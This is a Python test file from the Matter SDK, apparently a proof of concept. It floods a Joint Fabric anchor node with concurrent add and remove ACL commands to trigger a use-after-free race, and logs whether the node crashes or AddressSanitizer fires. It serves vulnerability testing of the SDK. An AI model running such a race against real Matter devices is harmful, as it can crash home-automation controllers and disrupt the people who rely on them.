#
#    Copyright (c) 2024 Project CHIP Authors
#    All rights reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License");
#    you may not use this file except in compliance with the License.
#    You may obtain a copy of the License at
#
#        http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.
#

# This test requires a TH_SERVER application. Please specify with --string-arg th_server_app_path:<path_to_app>

# See https://github.com/project-chip/connectedhomeip/blob/master/docs/testing/python.md#defining-the-ci-test-arguments
# for details about the block below.
#
# === BEGIN CI TEST ARGUMENTS ===
# test-runner-runs:
#   run1:
#     script-args: >
#       --string-arg jfa_server_app:${JF_ADMIN_APP}
#       --string-arg jfc_server_app:${JF_CONTROL_APP}
#       --trace-to json:${TRACE_TEST_JSON}.json
#       --trace-to perfetto:${TRACE_TEST_PERFETTO}.perfetto
#       --PICS src/app/tests/suites/certification/ci-pics-values
#     factory-reset: true
#     quiet: true
# === END CI TEST ARGUMENTS ===

import base64
import logging
import os
import random
import tempfile
from configparser import ConfigParser

from mobly import asserts

import matter.clusters as Clusters
from matter import CertificateAuthority
from matter.interaction_model import InteractionModelError, Status
# from matter.interaction_model import InteractionModelError
from matter.storage import VolatileTemporaryPersistentStorage
from matter.testing.apps import AppServerSubprocess, JFControllerSubprocess
from matter.testing.decorators import async_test_body
from matter.testing.matter_testing import MatterBaseTest
from matter.testing.runner import TestStep, default_matter_test_main

log = logging.getLogger(__name__)


class TC_JF_PoC(MatterBaseTest):

    @staticmethod
    def _decode_cert_bytes(cert_str: str) -> bytes:
        compact = "".join(cert_str.split())
        if compact.startswith("0x"):
            compact = compact[2:]
        try:
            return bytes.fromhex(compact)
        except ValueError:
            return base64.b64decode(compact)

    @async_test_body
    async def setup_class(self):
        super().setup_class()

        self.fabric_a_ctrl = None
        self.storage_fabric_a = self.user_params.get("fabric_a_storage", None)
        self.fabric_a_server_app = None
        self.devCtrlEcoA = None
        self.certAuthorityManagerA = None
        self.fabric_a_persistent_storage = None

        jfc_server_app = self.user_params.get("jfc_server_app", None)
        if not jfc_server_app:
            asserts.fail("This test requires a Joint Fabric Controller app. Specify app path with --string-arg jfc_server_app:<path_to_app>")
        if not os.path.exists(jfc_server_app):
            asserts.fail(f"The path {jfc_server_app} does not exist")

        jfa_server_app = self.user_params.get("jfa_server_app", None)
        if not jfa_server_app:
            asserts.fail("This test requires a Joint Fabrics Admin app. Specify app path with --string-arg jfa_server_app:<path_to_app>")
        if not os.path.exists(jfa_server_app):
            asserts.fail(f"The path {jfa_server_app} does not exist")

        # Create a temporary storage directory for both ecosystems to keep KVS files if not already provided by user.
        if self.storage_fabric_a is None:
            self.storage_directory_ecosystem_a = tempfile.TemporaryDirectory(prefix=self.__class__.__name__+"_A_")
            self.storage_fabric_a = self.storage_directory_ecosystem_a.name
            log.info("Temporary storage directory: %s", self.storage_fabric_a)

        #####################################################################################################################################
        #
        # Initialize Ecosystem A
        #
        #####################################################################################################################################
        self.jfctrl_fabric_a_vid = random.randint(0x0001, 0xFFF0)
        self.jfadmin_fabric_a_node_id = 1
        self.fabric_a_admin = None
        # If test is executed in CI environment, start JFA app for Fabric B
        if self.is_pics_sdk_ci_only:
            self.jfadmin_fabric_a_passcode = random.randint(110220011, 110220999)
            self.jfadmin_fabric_a_discriminator = random.randint(0, 4095)
            self.dut_rpc_server_ip = "127.0.0.1"
            self.dut_rpc_server_port = "33033"
            # Start Fabric A JF-Administrator App
            self.fabric_a_admin = AppServerSubprocess(
                jfa_server_app,
                storage_dir=self.storage_fabric_a,
                port=random.randint(5001, 5999),
                discriminator=self.jfadmin_fabric_a_discriminator,
                passcode=self.jfadmin_fabric_a_passcode,
                extra_args=["--capabilities", "0x04", "--rpc-server-port", self.dut_rpc_server_port])
            self.fabric_a_admin.start(
                expected_output="Server initialization complete",
                timeout=10)
        else:
            self.dut_rpc_server_ip = self.user_params.get("dut_rpc_server_ip", None)
            if not self.dut_rpc_server_ip:
                asserts.fail("DUT RPC server IP must be specified via --string-arg dut_rpc_server_ip:<ip_address>")
            self.dut_rpc_server_port = self.user_params.get("dut_rpc_server_port", None)
            if not self.dut_rpc_server_port:
                asserts.fail("DUT RPC server PORT must be specified via --string-arg dut_rpc_server_port:<port>")
            self.jfadmin_fabric_a_passcode = self.matter_test_config.setup_passcodes[0]
            if not self.jfadmin_fabric_a_passcode:
                asserts.fail(
                    "JF-Administrator passcode and discriminator must be specified via --passcode:<passcode> --discriminator:<discriminator>")
            self.jfadmin_fabric_a_discriminator = self.matter_test_config.discriminators[0]
            if not self.jfadmin_fabric_a_discriminator:
                asserts.fail(
                    "JF-Administrator passcode and discriminator must be specified via --passcode:<passcode> --discriminator:<discriminator>")

        # Start Fabric A JF-Controller App
        self.fabric_a_ctrl = JFControllerSubprocess(
            jfc_server_app,
            "JFC_A",  # Name of the controller instance, used for logging purposes in the JF-Controller app:w
            rpc_server_port=self.dut_rpc_server_port,
            storage_dir=self.storage_fabric_a,
            vendor_id=self.jfctrl_fabric_a_vid,
            extra_args=["--rpc-server-ip", self.dut_rpc_server_ip])
        self.fabric_a_ctrl.start(
            expected_output="CHIP task running",
            timeout=10)

        # Commission JF-ADMIN app with JF-Controller on Fabric A
        self.fabric_a_ctrl.send(
            message=f"pairing onnetwork {self.jfadmin_fabric_a_node_id} {self.jfadmin_fabric_a_passcode} --anchor true",
            expected_output=f"[JF] Anchor Administrator (nodeId={self.jfadmin_fabric_a_node_id}) commissioned with success",
            timeout=10)

        # Extract the Ecosystem A certificates and inject them in the storage that will be provided to a new Python Controller later
        jfcStorage = ConfigParser()
        jfcStorage.read(self.storage_fabric_a+'/chip_tool_config.alpha.ini')
        self.ecoACtrlStorage = {
            "sdk-config": {
                "ExampleOpCredsCAKey1": jfcStorage.get("Default", "ExampleOpCredsCAKey0"),
                "ExampleOpCredsICAKey1": jfcStorage.get("Default", "ExampleOpCredsICAKey0"),
                "ExampleCARootCert1": jfcStorage.get("Default", "ExampleCARootCert0"),
                "ExampleCAIntermediateCert1": jfcStorage.get("Default", "ExampleCAIntermediateCert0"),
            },
            "repl-config": {
                "caList": {
                    "1": [
                        {
                            "fabricId": 1,
                            "vendorId": self.jfctrl_fabric_a_vid
                        }
                    ]
                }
            }
        }
        # Extract CATs to be provided to the Python Controller later
        self.ecoACATs = base64.b64decode(jfcStorage.get("Default", "CommissionerCATs"))[::-1].hex().strip('0')

        self.icac_bytes = self._decode_cert_bytes(jfcStorage.get("Default", "ExampleCAIntermediateCert0"))
        if jfcStorage.has_option("Default", "ExampleCARootCert0"):
            self.icac_bytes_alt = self._decode_cert_bytes(jfcStorage.get("Default", "ExampleCARootCert0"))
        else:
            self.icac_bytes_alt = self.icac_bytes

    def teardown_class(self):
        # Shutdown in the correct order: Controller -> CertificateAuthorityManager -> PersistentStorage
        if self.devCtrlEcoA is not None:
            self.devCtrlEcoA.Shutdown()
            self.devCtrlEcoA = None

        if self.certAuthorityManagerA is not None:
            self.certAuthorityManagerA.Shutdown()
            self.certAuthorityManagerA = None

        if self.fabric_a_persistent_storage is not None:
            self.fabric_a_persistent_storage.Shutdown()
            self.fabric_a_persistent_storage = None
        # Stop all Subprocesses that were started in this test case
        if self.fabric_a_admin is not None:
            self.fabric_a_admin.terminate()
        if self.fabric_a_ctrl is not None:
            self.fabric_a_ctrl.terminate()
        if self.fabric_a_server_app is not None:
            self.fabric_a_server_app.terminate()

        super().teardown_class()


    @async_test_body
    async def test_TC_JF_PoC(self):
        import asyncio
        from matter.clusters.Types import NullValue

        JFDS = Clusters.JointFabricDatastore
        Priv = JFDS.Enums.DatastoreAccessControlEntryPrivilegeEnum
        Auth = JFDS.Enums.DatastoreAccessControlEntryAuthModeEnum
        anchor = self.jfadmin_fabric_a_node_id

        self.fabric_a_persistent_storage = VolatileTemporaryPersistentStorage(
            self.ecoACtrlStorage['repl-config'], self.ecoACtrlStorage['sdk-config'])
        self.certAuthorityManagerA = CertificateAuthority.CertificateAuthorityManager(
            chipStack=self.matter_stack._chip_stack, persistentStorage=self.fabric_a_persistent_storage)
        self.certAuthorityManagerA.LoadAuthoritiesFromStorage()
        self.devCtrlEcoA = self.certAuthorityManagerA.activeCaList[0].adminList[0].NewController(
            nodeId=101, paaTrustStorePath=str(self.matter_test_config.paa_trust_store_path),
            catTags=[int(self.ecoACATs, 16)])
        ctrl = self.devCtrlEcoA

        desc = await ctrl.ReadAttribute(nodeId=anchor, attributes=[(Clusters.Descriptor)], returnClusterObject=True)
        ep = next(e for e, d in desc.items() if JFDS.id in d[Clusters.Descriptor].serverList)
        log.info(f"JFDS endpoint = {ep}; anchor node = {anchor}")

        counter = [0]
        def acl():
            counter[0] += 1
            return JFDS.Structs.DatastoreAccessControlEntryStruct(
                privilege=Priv.kAdminister, authMode=Auth.kCase, subjects=[0x1000_0000_0000_0000 + counter[0]], targets=NullValue)

        async def one(cmd):
            try:
                await self.send_single_cmd(cmd=cmd, dev_ctrl=ctrl, node_id=anchor, endpoint=ep)
                return None
            except Exception as e:
                return type(e).__name__

        async def add(n):
            await asyncio.gather(*[one(JFDS.Commands.AddACLToNode(nodeID=anchor, ACLEntry=acl())) for _ in range(n)])

        async def live_listids():
            r = await ctrl.ReadAttribute(nodeId=anchor, attributes=[(ep, JFDS.Attributes.NodeACLList)], returnClusterObject=True)
            return [a.listID for a in r[ep][JFDS].nodeACLList]

        try:
            await self.send_single_cmd(cmd=JFDS.Commands.AddPendingNode(nodeID=anchor, friendlyName="self"),
                                       dev_ctrl=ctrl, node_id=anchor, endpoint=ep)
        except InteractionModelError as e:
            log.info(f"AddPendingNode -> {e}")

        await add(40)
        log.info(f"after pre-stage: size={len(await live_listids())}")

        unreachable_streak = 0
        for rnd in range(120):
            try:
                ids = await live_listids()
                unreachable_streak = 0
            except Exception as e:
                unreachable_streak += 1
                log.info(f"round {rnd}: read failed ({type(e).__name__}), streak={unreachable_streak}")
                if unreachable_streak >= 3:
                    log.info(f"round {rnd}: anchor unreachable 3x -> CRASHED")
                    break
                await asyncio.sleep(0.5)
                continue
            if len(ids) < 16:
                await add(40)
                ids = await live_listids()
            # moderate concurrency: 8 removes (each holds a raw iterator across its async self-sync window)
            # overlapping 20 unique adds that reallocate mACLEntries.
            ops = [one(JFDS.Commands.RemoveACLFromNode(listID=lid, nodeID=anchor)) for lid in ids[:8]]
            ops += [one(JFDS.Commands.AddACLToNode(nodeID=anchor, ACLEntry=acl())) for _ in range(20)]
            res = await asyncio.gather(*ops)
            errs = sum(1 for r in res if r)
            if rnd % 10 == 0:
                log.info(f"round {rnd}: {len(res)} ops, {errs} errs, list~{len(ids)}")

        await asyncio.sleep(2)
        try:
            log.info(f"FINAL: anchor ALIVE, size={len(await live_listids())}")
        except Exception as e:
            log.info(f"FINAL: anchor UNREACHABLE: {type(e).__name__}")
        log.info("=== END RACE (check log for AddressSanitizer) ===")


if __name__ == "__main__":
    default_matter_test_main()
